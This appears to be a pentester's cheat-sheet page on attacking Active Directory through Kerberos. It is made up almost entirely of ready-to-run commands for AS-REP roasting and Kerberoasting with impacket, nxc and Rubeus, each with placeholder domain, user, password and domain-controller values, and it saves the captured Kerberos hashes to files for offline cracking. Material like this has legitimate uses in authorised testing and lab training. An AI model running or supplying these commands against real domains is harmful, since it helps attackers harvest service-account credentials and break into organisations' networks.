---
title: "Kerberoasting"
date: 2024-7-6
tags: ["as_rep roasting", "impacket", "active directory", "ad", "domain controller", "Windows", "kerberoasting", "GetNPUsers"]
---

---
### AS_REP Roasting

{{< tab set1 tab1 active >}}Impacket{{< /tab >}}
{{< tab set1 tab2 >}}nxc{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```bash
# Multiple valid usernames
impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -no-pass -dc-ip <DC>
```

```bash
# Single user without creds
impacket-GetNPUsers -no-pass -dc-ip 10.10.11.10 <DOMAIN>/<USER>
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

<div>

```bash
# Multiple valid usernames (nxc)
nxc ldap 10.10.11.10 -u usernames.txt -p '' --asreproast as_rep_hashes.txt
```

</div>

{{< /tabcontent >}}

<br>

---

### Kerberoasting (From Linux)

{{< tab set2 tab1 active >}}Impacket{{< /tab >}}
{{< tab set2 tab2 >}}nxc{{< /tab >}}
{{< tabcontent set2 tab1 >}}

<div>

```bash
# Fix time skew
sudo ntpdate -s <DC> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
```

</div>

<small>*Note: Times skew have to be within 5 minutes in kerberos*</small>

<div>

```bash
# Kerberoasting without cred
sudo ntpdate -s <DC> && impacket-GetUserSPNs -no-preauth <USER_WITH_DONT_REQUIRE_PREAUTH> -usersfile usernames.txt -dc-host <DC_IP> <DOMAIN>/
```

</div>

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

<div>

```bash
nxc ldap <DC_IP> -u <UESR> -p <PASSWORD> --kerberoasting kerberoast_hashes.txt
```

</div>

{{< /tabcontent >}}

### Kerberoasting (From Windows)

{{< tab set3 tab1 active >}}rubeus{{< /tab >}}
{{< tabcontent set3 tab1 >}}

<div>

```cmd
.\rubeus.exe kerberoast /creduser:<DOMAIN>\<USER> /credpassword:<PASSWORD>
```

</div>

{{< /tabcontent >}}


<br>